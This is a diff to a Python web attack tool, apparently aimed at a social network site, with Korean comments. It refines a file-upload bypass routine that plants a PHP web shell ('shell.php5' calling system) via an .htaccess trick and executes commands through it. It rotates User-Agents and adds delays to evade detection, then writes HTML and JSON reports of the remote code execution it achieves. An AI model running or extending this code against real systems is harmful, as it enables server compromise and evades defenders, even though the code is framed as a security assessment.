@@ -10,11 +10,12 @@ import base64
 import string
 
 class AdvancedVulnerableSNSAttacker:
-    def __init__(self, base_url, attacker_server, stealth_mode=True):
+    def __init__(self, base_url, attacker_server, stealth_mode=True, report_dir="security_reports"):
         self.base_url = base_url.rstrip('/')
         self.attacker_server = attacker_server.rstrip('/')
         self.session = requests.Session()
         self.stealth_mode = stealth_mode
+        self.report_dir = report_dir
         
         # User-Agent 로테이션을 위한 리스트
         self.user_agents = [
@@ -450,11 +451,18 @@ php_flag engine on
         
         success_count = 0
         successful_shells = []
+        uploaded_files = set()
         
         print("[*] Testing multiple file upload bypass techniques...")
         
         for filename, content_type, variant, description in bypass_techniques:
             try:
+                # 이미 같은 이름의 파일이 성공했으면 건너뛰기
+                base_filename = filename.replace('\x00', '').replace('%00', '')
+                if base_filename in uploaded_files:
+                    print(f"\n[*] Skipping {description} - {base_filename} already uploaded")
+                    continue
+
                 self.add_delay()  # 탐지 회피
                 
                 # User-Agent 로테이션
@@ -500,21 +508,28 @@ php_flag engine on
                 
                 if 'success' in response.text.lower() or 'uploaded' in response.text.lower() or filename in response.text:
                     print(f"[+] File uploaded successfully!")
+
+                    # 업로드된 파일명 기록
+                    uploaded_files.add(base_filename)
                     
                     # 실행 테스트
                     actual_filename = filename.replace('\x00', '').replace('%00', '')
 
                     # htaccess는 직접 실행할 수 없으므로 PHP 파일 업로드
                     if actual_filename == '.htaccess':
-                        # htaccess 업로드 후 PHP5 파일로 쉘 실행 테스트
-                        test_filename = 'shell.php5'
-                        test_content = b'<?php system("whoami"); ?>'
-                        files = {'file': (test_filename, test_content, 'application/x-php')}
-
-                        upload_response = self.session.post(upload_url, files=files)
-                        if 'success' in upload_response.text.lower():
-                            actual_filename = test_filename
-                            print(f"[+] Additional shell uploaded: {test_filename}")
+                        # shell.php5가 이미 업로드되지 않았을 때만
+                        if 'shell.php5' not in uploaded_files:
+                            test_filename = 'shell.php5'
+                            test_content = b'<?php system("whoami"); ?>'
+                            files = {'file': (test_filename, test_content, 'application/x-php')}
+                            upload_response = self.session.post(upload_url, files=files)
+                            if 'success' in upload_response.text.lower():
+                                actual_filename = test_filename
+                                uploaded_files.add(test_filename)
+                                print(f"[+] Additional shell uploaded: {test_filename}")
+                        else:
+                            print(f"[*] shell.php5 already exists, skipping additional upload")
+                            continue # <- 이미 있으면 다음 기법으로
 
                     # 모든 PHP 확장자 파일에 대해 실행 테스트
                     if any(ext in actual_filename.lower() for ext in ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar']):
@@ -533,15 +548,53 @@ php_flag engine on
                                 if any(indicator in response_text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=', 'gid=', '/', 'home']):
                                     print(f"\n[+] SUCCESS! Command executed: {cmd}")
                                     
-                                    # BeautifulSoup으로 정확한 출력 추출 시도
+                                    # 어떤 indicator가 발견되었는지 찾기
+                                    found_indicator = None
+                                    for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=', 'gid=', '/', 'home']:
+                                        if indicator in response_text:
+                                            found_indicator = indicator
+                                            break
+
+                                    # 1단계: BeautifulSoup으로 시도
                                     soup = BeautifulSoup(response_text, 'html.parser')
                                     content_div = soup.find('div', class_='file-content')
+
+                                    output = "" # 초기화
                                     
                                     if content_div:
-                                        output = content_div.get_text(strip=True)
-                                    else:
-                                        # div가 없으면 전체 텍스트에서 추출
-                                        output = response_text.strip()
+                                        # content_div의 텍스트 추출
+                                        raw_output = content_div.get_text(strip=True)
+                                        # PHP 코드나 HTML 태그가 아닌 실제 출력만
+                                        if raw_output and '<?php' not in raw_output and '<' not in raw_output:
+                                            output = raw_output
+                                            print(f"[DEBUG] Output from content_div: {output[:50]}...")
+                                    
+                                    # 2단계: content_div에서 못 찾았으면 전체 텍스트에서 찾기
+                                    if not output:
+                                        # 특정 명령어별로 패턴 매칭
+                                        if cmd == 'whoami':
+                                            match = re.search(r'(www-data|apache|nginx|root|nobody|daemon)', response_text)
+                                            if match:
+                                                output = match.group(1)
+                                        elif cmd == 'id':
+                                            match = re.search(r'(uid=\d+\([^)]+\)[^<\n]*)', response_text)
+                                            if match:
+                                                output = match.group(1)
+                                        elif cmd == 'pwd':
+                                            match = re.search(r'(/(?:var|home|usr|tmp|www)[/\w-]*)', response_text)
+                                            if match:
+                                                output = match.group(1)
+                                        elif 'ls' in cmd:
+                                            # ls 결과는 보통 여러 줄
+                                            matches = re.findall(r'^([drwx-]+\s+\d+\s+\w+\s+\w+.*?)$', response_text, re.MULTILINE)
+                                            if matches:
+                                                output = '\n'.join(matches[:3])  # 처음 3줄만
+                                    
+                                    # 3단계: 여전히 못 찾았으면 기본값
+                                    if not output:
+                                        # 실행은 성공했지만 파싱 실패
+                                        output = f"Execution confirmed (response contains '{found_indicator}') but exact output not parsed"
+                                        print(f"[DEBUG] Using fallback output message")
                                     
                                     print(f"    Output preview: {output[:100]}...")
                                     
@@ -555,11 +608,13 @@ php_flag engine on
                                         'actual_filename': actual_filename,
                                         'bypass_technique': description + (f" (via .htaccess)" if filename == '.htaccess' else ""),
                                         'command': cmd,
-                                        'output': output[:200],
+                                        'output': output, # 절대 빈 문자열이 되지 않도록
                                         'access_url': f"{file_url}?name={actual_filename}&cmd={cmd}",
                                         'impact': 'CRITICAL - Remote Code Execution via advanced file upload bypass',
                                         'cvss_score': 10.0
                                     }
+                                    # 저장 전 확인
+                                    print(f"[DEBUG] Saving vuln with output: {vuln_info['output'][:50]}...")
                                     self.vulnerabilities['file_upload'].append(vuln_info)
                                     
                                     self.log_event(
@@ -589,12 +644,47 @@ php_flag engine on
                         
                         if any(indicator in cmd_response.text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=']):
                             print(f"[+] Image file executed as PHP!")
-                            success_count += 1
-                            successful_shells.append(actual_filename)
                             
+                            # 어떤 indicator가 발견되었는지 찾기
+                            found_indicator = None
+                            for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=']:
+                                if indicator in cmd_response.text:
+                                    found_indicator = indicator
+                                    break
+                            
+                            # output 추출 로직 (위와 동일)
                             soup = BeautifulSoup(cmd_response.text, 'html.parser')
                             content_div = soup.find('div', class_='file-content')
-                            output = content_div.get_text(strip=True) if content_div else cmd_response.text.strip()
+                            
+                            output = ""  # 초기화
+                            
+                            if content_div:
+                                raw_output = content_div.get_text(strip=True)
+                                if raw_output and '<?php' not in raw_output and '<' not in raw_output:
+                                    output = raw_output
+                                    print(f"[DEBUG] Output from content_div: {output[:50]}...")
+                            
+                            # content_div에서 못 찾았으면 전체 텍스트에서 찾기
+                            if not output:
+                                # whoami 명령이므로 사용자명 패턴 찾기
+                                match = re.search(r'(www-data|apache|nginx|root|nobody|daemon)', cmd_response.text)
+                                if match:
+                                    output = match.group(1)
+                                elif 'uid=' in cmd_response.text:
+                                    match = re.search(r'(uid=\d+\([^)]+\)[^<\n]*)', cmd_response.text)
+                                    if match:
+                                        output = match.group(1)
+                            
+                            # 여전히 못 찾았으면 기본값
+                            if not output:
+                                output = f"Execution confirmed (response contains '{found_indicator}') but exact output not parsed"
+                                print(f"[DEBUG] Using fallback output message")
+                            
+                            print(f"    Output: {output[:100]}...")
+                            
+                            success_count += 1
+                            successful_shells.append(actual_filename)
+                            self.uploaded_webshell = actual_filename
                             
                             vuln_info = {
                                 'upload_url': upload_url,
@@ -602,13 +692,30 @@ php_flag engine on
                                 'actual_filename': actual_filename,
                                 'bypass_technique': description,
                                 'command': 'whoami',
-                                'output': output[:200],
+                                'output': output,  # 전체 output 사용 ([:200] 제거)
                                 'access_url': f"{file_url}?name={actual_filename}&cmd=whoami",
                                 'impact': 'CRITICAL - Image file executed as PHP code',
                                 'cvss_score': 10.0
                             }
+                            
+                            # 저장 전 확인
+                            print(f"[DEBUG] Saving image exec vuln with output: {vuln_info['output'][:50]}...")
+                            
                             self.vulnerabilities['file_upload'].append(vuln_info)
-                        
+                            
+                            self.log_event(
+                                'FILE_UPLOAD_RCE_IMAGE',
+                                f'Image file executed as PHP: {actual_filename}',
+                                'CRITICAL',
+                                {
+                                    'filename': actual_filename,
+                                    'bypass_method': description,
+                                    'output': output[:100]
+                                }
+                            )
+                    else:
+                        print(f"[*] File uploaded but not executable: {actual_filename}")
+
                 else:
                     print(f"[-] Upload failed or blocked")
                     
@@ -1258,6 +1365,12 @@ php_flag engine on
     # 나머지 메서드들은 원본과 동일하게 유지
     def generate_html_report(self):
         """상세한 HTML 리포트 생성"""
+        import os
+        # 리포트 저장 폴더 생성
+        report_dir = "security_reports"
+        if not os.path.exists(report_dir):
+            os.makedirs(report_dir)
+
         end_time = datetime.now()
         duration = (end_time - self.start_time).seconds
     
@@ -1581,6 +1694,10 @@ php_flag engine on
             for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                 cvss = vuln.get('cvss_score', 0)
                 cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
+
+                # output 필드 확인
+                output = vuln.get('output', 'No output captured')
+
                 html_content += f"""
             <div class="vuln-card">
                 <h3>File Upload RCE #{idx} - 원격 코드 실행
@@ -1593,7 +1710,9 @@ php_flag engine on
                     <strong>업로드된 웹쉘:</strong> <code>{vuln['filename']}</code>
                 </div>
                 <div class="vuln-detail">
-                    <strong>테스트 명령:</strong> <code>{vuln['command']}</code><br>
+                    <strong>테스트 명령:</strong> <code>{vuln['command']}</code>
+                </div>
+                <div class="vuln-detail">
                     <strong>실행 결과:</strong> <code>{vuln['output']}</code>
                 </div>
                 <div class="vuln-detail">
@@ -1654,11 +1773,11 @@ php_flag engine on
 """
 
         # XSS/CSRF 취약점
-        if self.vulnerabilities['xss']:
+        if self.vulnerabilities['csrf']:
             html_content += """
             <h3 style="color: #dc3545; margin-top: 30px;">4️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
 """
-            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
+            for idx, vuln in enumerate(self.vulnerabilities['csrf'], 1):
                 cvss = vuln.get('cvss_score', 0)
                 cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                 html_content += f"""
@@ -1765,16 +1884,25 @@ php_flag engine on
 </html>
 """
         
-        # HTML 파일 저장
+        # HTML 파일 저장 (폴더 경로 포함)
         report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-        with open(report_filename, 'w', encoding='utf-8') as f:
+        report_path = os.path.join(report_dir, report_filename)
+
+        with open(report_path, 'w', encoding='utf-8') as f:
             f.write(html_content)
         
-        print(f"\n[+] HTML Report saved: {report_filename}")
-        return report_filename
+        print(f"\n[+] HTML Report saved: {report_path}")
+        return report_path
 
     def generate_json_report(self):
         """JSON 리포트 생성"""
+        import os
+
+        # 리포트 저장 폴더 생성
+        report_dir = "security_reports"
+        if not os.path.exists(report_dir):
+            os.makedirs(report_dir)
+
         report = {
             'metadata': {
                 'target': self.base_url,
@@ -1810,11 +1938,13 @@ php_flag engine on
         }
         
         report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(report_filename, 'w', encoding='utf-8') as f:
+        report_path = os.path.join(report_dir, report_filename)
+
+        with open(report_path, 'w', encoding='utf-8') as f:
             json.dump(report, f, indent=2, ensure_ascii=False)
         
-        print(f"[+] JSON Report saved: {report_filename}")
-        return report_filename
+        print(f"[+] JSON Report saved: {report_path}")
+        return report_path
 
     def run_assessment(self):
         """전체 평가 실행"""
